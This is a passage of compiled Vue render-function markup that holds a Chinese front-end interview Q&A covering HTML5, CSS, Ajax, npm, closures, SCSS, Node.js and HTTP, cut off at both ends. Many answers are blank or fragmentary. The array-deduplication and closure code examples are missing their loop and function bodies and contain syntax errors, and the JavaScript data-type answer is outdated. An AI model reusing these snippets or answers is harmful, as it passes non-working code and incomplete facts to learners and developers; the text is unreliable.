")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v("table")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("margin")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(181,206,168)"}},[n._v("5px")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("width")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(181,206,168)"}},[n._v("500px")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("height")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(181,206,168)"}},[n._v("300px")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("background-color")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v("#ccc")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(215,186,125)"}},[n._v(".cell")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("display")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v("table-cell")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("padding")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(181,206,168)"}},[n._v("10px")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("vertical-align")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v("middle")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(96,139,78)"}},[n._v("/*该属性是定义行内元素垂直对齐的，只有行内元素会生效。在表单元格中，这个属性会设置单元格框中的单元格内容的对齐方式。*/")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("style")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("div")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("class")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v('"table"')]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("div")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("class")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v('"cell"')]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("内容内容内容内容内容内内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("div")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("div")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",[t("strong")]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("61、")]),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("html5有哪些新特性？如何区分 HTML 和 HTML5？")])]),t("span",{staticStyle:{background:"rgb(255,255,255)"}}),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("HTML5 现在已经不是 SGML\n        的子集，主要是关于图像，位置，存储，多任务等功能的增加。")]),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("(1)绘画 canvas;")]),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("(2)用于媒介回放的 video 和 audio 元素;")]),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("(3)本地离线存储 localStorage\n        长期存储数据，浏览器关闭后数据不丢失;")]),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("(4)sessionStorage 的数据在浏览器关闭后自动删除;")]),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("(5)语意化更好的内容元素，比如\n        article、footer、header、nav、section;")]),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("(6)表单控件，calendar、date、time、email、url、search;")])]),t("p",[n._v("\n      区别："),t("strong",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("<!DOCTYPE html")]),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v(">")])])]),t("p",[t("strong",[t("span",{staticStyle:{background:"rgb(255,255,255)"}})])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[n._v("62、"),t("span",{staticStyle:{color:"rgb(44,44,44)"}},[n._v("CSS选择符CSS选择符有哪些？")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(57,57,57)",background:"rgb(250,247,239)"}}),t("span",{staticStyle:{color:"rgb(57,57,57)",background:"rgb(250,247,239)"}}),t("span",{staticStyle:{color:"rgb(57,57,57)",background:"rgb(250,247,239)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}}),t("p",[t("strong",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("63、")]),n._v("如何消除一个数组里面重复的元素？")])]),t("table",{attrs:{border:"0",cellspacing:"2"}},[t("tbody",[t("tr",[t("td",[t("p"),t("p"),t("p"),t("p"),t("p"),t("p"),t("p"),t("p"),t("p"),t("p")]),t("td",[t("p",[n._v("// 方法一：")]),t("p",[n._v("var arr1 =[1,2,2,2,3,3,3,4,5,6],")]),t("p",[n._v("var arr2 = [];")]),t("p",[n._v("var len = arr1.length;")]),t("p",[n._v("for(var i = 0;i<len; i++){")]),t("p"),t("p"),t("p"),t("p",[n._v("}")]),t("p",[n._v("document.write(arr2); // 1,2,3,4,5,6")]),t("p")])])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[n._v("64、"),t("span",{staticStyle:{color:"rgb(44,44,44)"}})])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("js中有六种数据类型，包括五种基本数据类型（Number,String,Boolean,Undefined,Null）,和一种复杂数据类型（Object）。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("65、")]),n._v("ajax的优点")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("1")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("、最大的一点是页面无刷新，在页面内与服务器通信，给用户的体验非常好。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("2")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("、使用异步方式与服务器通信，不需要打断用户的操作，具有更加迅速的响应能力。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("3")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("、可以把以前一些服务器负担的工作转嫁到客户端，利用客户端闲置的能力来处理，减轻服务器和带宽的负担，节约空间和宽带租用成本。并且减轻服务器的负担，")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("ajax")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("的原则是")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("“")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("按需取数据")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("”")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("，可以最大程度的减少冗余请求，和响应对服务器造成的负担。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("66、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("XMLhttprequest对象")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("ajax工作原理、核心思想）")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("Ajax的核心是JavaScript对象XmlHttpRequest。它是一种支持异步请求的技术。简而言之，XmlHttpRequest使您可以使用JavaScript向服务器提出请求并处理响应，而不阻塞用户。通过XMLHttpRequest对象，Web开发人员可以在页面加载以后进行页面的局部更新。")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("67、npm是什么？\n        ")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("NPM是随同NodeJS一起安装的包管理工具")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("NPM服务器下载别人编写的第三方包到本地使用")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("B")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("ower用法相同")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("68、css省略号怎么写")])])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("单行")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(75,75,75)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("overflow")]),t("span",{staticStyle:{color:"rgb(43,145,175)"}},[n._v(":hidden;")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(43,145,175)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("text-overflow")]),t("span",{staticStyle:{color:"rgb(43,145,175)"}},[n._v(":ellipsis;")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(43,145,175)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("white-space")]),t("span",{staticStyle:{color:"rgb(43,145,175)"}},[n._v(":nowrap")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("div")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("id=")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v('"con"')]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,255)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("span")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("id=")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v('"txt"')]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v(">文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略</")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("span>")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,255)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("span")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("class=")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v('"t"')]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("></")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("span>")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("div>")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("style>")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("#txt")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("{")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,255)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("display:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("inline-block")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("height:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("40px")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("width:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("250px")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("line-height:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("20px")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("overflow:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("hidden")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("font-size:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("16px")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("}")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(".t")]),t("span",{staticStyle:{color:"rgb(43,145,175)"}},[n._v(":after")]),t("span",{staticStyle:{color:"rgb(43,145,175)"}},[n._v("{")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(43,145,175)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("display:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("inline")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("content:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v('"..."')]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("font-size:")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}}),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("16px")]),t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(163,21,21)"}},[n._v("}")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("style>")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("69、什么是闭包")])])]),t("p",[t("span",{staticStyle:{color:"rgb(26,26,26)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(26,26,26)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v('<button type="button"\n        onclick="myFunction()">计数!</button>')])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v('<p id="demo">0</p>')])]),t("p",[t("span",{staticStyle:{color:"rgb(255,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("<script>")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("var add = (function () {")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("return function () { ")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("return counter += 1;")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("}")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("})();")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("function myFunction(){")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("}")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("<\/script>")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("70、less用过吗？用哪些特性")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("mixin）、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("71")])]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(57,57,57)",background:"rgb(250,247,239)"}})])]),t("p",[t("span",{staticStyle:{color:"rgb(57,57,57)",background:"rgb(250,247,239)"}},[n._v("CSS")]),t("span",{staticStyle:{color:"rgb(57,57,57)",background:"rgb(250,247,239)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(57,57,57)",background:"rgb(250,247,239)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(57,57,57)",background:"rgb(250,247,239)"}},[n._v("72、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("scss是什么？在vue.cli中的安装使用步骤是？有哪几大特性？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("css的预编译。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("使用步骤：")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("npm 下三个loader（sass-loader、css-loader、node-sass）")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("build目录找到webpack")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".base.config.js")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("extends属性中加一个拓展")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".scss")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("module属性")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("style标签加上lang属性 ，例如：lang=”scss”")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(":")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,128,128)"}},[n._v("1")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("$变量名称=值）；")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,128,128)"}},[n._v("2")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("、可以用混合器，例如（）")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,128,128)"}},[n._v("3")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("、可以嵌套")])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("73、SVN是什么？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("74、怎么理解前后端分离？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("前后端分离的核心：后台提供数据，前端负责显示")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("75、")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("Ajax处理跨域的方式有三种：代理、jsonp、XHR2")])])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("76、什么是node.js？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("JavaScript")]),n._v("，具有超强的高并发能力\n    ")]),t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("Java、PHP或者.net等服务器端语言中，会为每一个客户端连接创建一个新的线程。而每个线程需要耗费大约2MB内存。也就是说，理论上，一个8GB内存的服务器可以同时连接的最大用户数为4000个左右。要让Web应用程序支持更多的用户，就需要增加服务器的数量，而Web应用程序的硬件成本当然就上升了。")])]),t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("Node.js不为每个客户连接创建一个新的线程，而仅仅使用一个线程。当有用户连接了，就触发一个内部事件，通过非阻塞I/O、事件驱动机制，让Node.js程序宏观上也是并行的。使用Node.js，一个8GB内存的服务器，可以同时处理超过4万用户的连接。")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("77、http协议")])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}}),t("a",{attrs:{href:"http://www.abc.com:8080",rel:"nofollow"}},[t("u",[t("span",{staticStyle:{color:"rgb(0,0,255)",background:"rgb(255,255,255)"}},[n._v("http://www.abc.com:8080")])])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("a",{attrs:{href:"http://www.abc.com",rel:"nofollow"}},[t("u",[t("span",{staticStyle:{color:"rgb(0,0,255)",background:"rgb(255,255,255)"}},[n._v("www.abc.com")])])]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("78、字符串插值